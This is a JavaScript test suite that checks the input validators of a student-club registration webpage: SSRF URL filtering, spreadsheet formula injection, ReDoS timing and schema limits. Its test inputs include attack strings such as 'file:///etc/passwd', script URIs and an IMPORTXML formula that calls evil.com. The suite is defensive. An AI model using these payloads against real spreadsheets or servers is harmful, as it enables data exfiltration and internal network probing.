/**
 * Security Verification Test Suite for STIC Webpage
 * Audited by Principal Security Architect & Systems Auditor
 *
 * Validates:
 * 1. SSRF & Protocol Filtering (IPv4, IPv6, Octal/Hex, Non-Standard Ports, Userinfo)
 * 2. Formula / CSV Injection (CWE-1236)
 * 3. ReDoS Resilience & Linear Evaluation Timing
 * 4. Boundary & Strict Schema Enforcement
 * 5. State Machine & Rate Limiter Resilience
 */

import { 
  validateSafeUrl, 
  sanitizeForSpreadsheet, 
  validateRegistrationPayload, 
  checkSubmissionRateLimit, 
  recordSubmissionTimestamp,
  sanitizeText,
  ALLOWED_BRANCHES,
  ALLOWED_YEARS,
  ALLOWED_GUILDS
} from '../src/utils/security.js';

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`[PASS] ${message}`);
    passed++;
  } else {
    console.error(`[FAIL] ${message}`);
    failed++;
  }
}

console.log('=== 1. SSRF, Network Protocol & IP Validation (CWE-918) ===');
// Block dangerous protocols
assert(!validateSafeUrl('javascript:alert(1)').valid, 'Blocks javascript: pseudo-protocol');
assert(!validateSafeUrl('data:text/html,<script>alert(1)</script>').valid, 'Blocks data: URI');
assert(!validateSafeUrl('vbscript:msgbox(1)').valid, 'Blocks vbscript: pseudo-protocol');
assert(!validateSafeUrl('file:///etc/passwd').valid, 'Blocks file: URI scheme');
assert(!validateSafeUrl('ftp://internal-server.local').valid, 'Blocks ftp: protocol');
assert(!validateSafeUrl('blob:http://localhost/uuid').valid, 'Blocks blob: protocol');

// Block IPv4 Loopback and Private IP ranges (RFC 1918 & RFC 3927)
assert(!validateSafeUrl('http://127.0.0.1:8080').valid, 'Blocks 127.0.0.1 loopback address');
assert(!validateSafeUrl('http://localhost:3000').valid, 'Blocks localhost hostname');
assert(!validateSafeUrl('http://10.0.0.1/admin').valid, 'Blocks 10.0.0.0/8 private network');
assert(!validateSafeUrl('http://172.16.0.5/internal').valid, 'Blocks 172.16.0.0/12 private network');
assert(!validateSafeUrl('http://192.168.1.1/router').valid, 'Blocks 192.168.0.0/16 private network');
assert(!validateSafeUrl('http://169.254.169.254/latest/meta-data').valid, 'Blocks AWS/GCP link-local metadata IP');

// Block Obfuscated & Alternate IP representations
assert(!validateSafeUrl('http://0177.0.0.1/').valid, 'Blocks octal IP address notation');
assert(!validateSafeUrl('http://0x7f.1/').valid, 'Blocks hex IP address notation');
assert(!validateSafeUrl('http://2130706433/').valid, 'Blocks decimal integer IP address notation');

// Block IPv6 Loopback, Link-Local & Unique-Local ranges
assert(!validateSafeUrl('http://[::1]/').valid, 'Blocks IPv6 loopback [::1]');
assert(!validateSafeUrl('http://[fe80::1]/').valid, 'Blocks IPv6 link-local [fe80::1]');
assert(!validateSafeUrl('http://[fc00::1]/').valid, 'Blocks IPv6 unique local [fc00::1]');
assert(!validateSafeUrl('http://[::ffff:127.0.0.1]/').valid, 'Blocks IPv4-mapped IPv6 loopback');

// Block Internal Network TLDs (.local, .internal, .lan)
assert(!validateSafeUrl('http://dc01.corp.local/').valid, 'Blocks .local internal domain');
assert(!validateSafeUrl('http://k8s-master.internal/').valid, 'Blocks .internal mDNS/cloud domain');
assert(!validateSafeUrl('http://router.lan/').valid, 'Blocks .lan local gateway domain');

// Block Embedded User Credentials (RFC 3986 evasion vector)
assert(
  !validateSafeUrl('https://admin:secret@script.google.com/macros/s/123/exec').valid,
  'Blocks embedded user credentials (user:pass@host)'
);

// Block Non-Standard Network Ports
assert(
  !validateSafeUrl('https://script.google.com:8080/macros/s/123/exec').valid,
  'Blocks non-standard port :8080'
);
assert(
  !validateSafeUrl('https://script.google.com:22/macros/s/123/exec').valid,
  'Blocks SSH port :22'
);

// Enforce Domain & Path allowlists for Google Apps Script Web App
assert(
  validateSafeUrl('https://script.google.com/macros/s/AKfycbx_TestDeploy123/exec', ['script.google.com']).valid,
  'Allows valid Google Apps Script deployment URL'
);
assert(
  !validateSafeUrl('https://evil-harvester.com/steal', ['script.google.com']).valid,
  'Rejects unapproved domain not in allowlist'
);
assert(
  !validateSafeUrl('https://script.google.com/evil/path/not/macro', ['script.google.com']).valid,
  'Rejects invalid Google Apps Script path pattern'
);

console.log('\n=== 2. Formula & CSV Injection Prevention (CWE-1236) ===');
assert(sanitizeForSpreadsheet('=CMD("calc")') === "'=CMD(\"calc\")", 'Neutralizes "=" formula prefix');
assert(sanitizeForSpreadsheet('+SUM(A1:A10)') === "'+SUM(A1:A10)", 'Neutralizes "+" formula prefix');
assert(sanitizeForSpreadsheet('-2+5') === "'-2+5", 'Neutralizes "-" formula prefix');
assert(sanitizeForSpreadsheet('@IMPORTXML("http://evil.com","//a")') === "'@IMPORTXML(\"http://evil.com\",\"//a\")", 'Neutralizes "@" formula prefix');
assert(sanitizeForSpreadsheet('\tMALICIOUS') === "'\tMALICIOUS", 'Neutralizes tab character formula prefix');
assert(sanitizeForSpreadsheet('\rMALICIOUS') === "'\rMALICIOUS", 'Neutralizes carriage return formula prefix');
assert(sanitizeForSpreadsheet('%SYSTEM%') === "'%SYSTEM%", 'Neutralizes "%" formula prefix');
assert(sanitizeForSpreadsheet('|MALICIOUS') === "'|MALICIOUS", 'Neutralizes "|" pipe prefix');
assert(sanitizeForSpreadsheet('   =SUM(1,2)') === "'=SUM(1,2)", 'Neutralizes trimmed whitespace leading formula');
assert(sanitizeForSpreadsheet('Benign Student Name') === 'Benign Student Name', 'Preserves benign student name unchanged');

console.log('\n=== 3. ReDoS Resilience & Linear Regex Evaluation (CWE-1333) ===');
// Benchmark email regex against pathological backtracking pattern
const startTime = performance.now();
const adversarialEmail = 'a'.repeat(60) + '@' + 'a'.repeat(60) + '!.com';
const testPayload = {
  fullName: 'Ayush Mishra',
  rollNo: '220999901001',
  email: adversarialEmail,
  branch: 'CSE',
  year: '3rd Year',
  guild: 'STIC Coding Guild',
  interests: 'Security',
  portfolio: '',
  message: '',
  referralKey: ''
};
const res = validateRegistrationPayload(testPayload);
const duration = performance.now() - startTime;
assert(!res.isValid, 'Rejects invalid adversarial email structure');
assert(duration < 25, `Email regex evaluates deterministically in ${duration.toFixed(2)}ms (ReDoS safe < 25ms)`);

console.log('\n=== 4. Boundary & Strict Schema Enforcement ===');
const validStudent = {
  fullName: 'Ayush Mishra',
  rollNo: '220999901001',
  email: 'ayush@example.com',
  branch: 'CSE',
  year: '3rd Year',
  guild: 'STIC Coding Guild',
  interests: 'Systems Programming & Auditing',
  portfolio: 'https://github.com/ayush',
  message: 'Passionate about engineering reliable platforms.',
  referralKey: 'CAMPUS-2026'
};

const validResult = validateRegistrationPayload(validStudent);
assert(validResult.isValid, 'Accepts conforming registration payload');
assert(validResult.sanitizedData.fullName === 'Ayush Mishra', 'Properly stores sanitized full name');
assert(validResult.sanitizedData.guild === 'STIC Coding Guild', 'Properly stores authorized guild');

// Test strict bounds & allowlists
const malformedStudent = {
  fullName: 'X', // Minimum 2 chars required
  rollNo: 'INVALID#@!%*', // Illegal symbols
  email: 'not_an_email',
  branch: 'BIOTECH', // Disallowed department
  year: '10th Year', // Disallowed year
  guild: 'Hacking Guild', // Disallowed track
  interests: '',
  portfolio: 'javascript:alert(1)', // Dangerous protocol
  referralKey: 'BAD KEY WITH SPACES'
};

const malformedResult = validateRegistrationPayload(malformedStudent);
assert(!malformedResult.isValid, 'Rejects malformed student registration');
assert(!!malformedResult.errors.fullName, 'Enforces name minimum length');
assert(!!malformedResult.errors.rollNo, 'Enforces roll number character constraints');
assert(!!malformedResult.errors.email, 'Enforces valid RFC email structure');
assert(!!malformedResult.errors.branch, 'Enforces branch allowlist constraint');
assert(!!malformedResult.errors.year, 'Enforces year allowlist constraint');
assert(!!malformedResult.errors.guild, 'Enforces guild allowlist constraint');
assert(!!malformedResult.errors.portfolio, 'Enforces portfolio URL security');

console.log('\n=== 5. String Length Capping & Bounding Defense ===');
const hugeString = 'A'.repeat(5000);
const cappedName = sanitizeText(hugeString, 100);
assert(cappedName.length === 100, 'Caps oversized input to specified length limit');

console.log(`\n========================================`);
console.log(`Test Execution Summary: ${passed} passed, ${failed} failed.`);
console.log(`========================================`);

if (failed > 0) {
  process.exit(1);
} else {
  console.log('ALL DEFENSIVE SECURITY CONTROLS VERIFIED SUCCESSFULLY.');
}
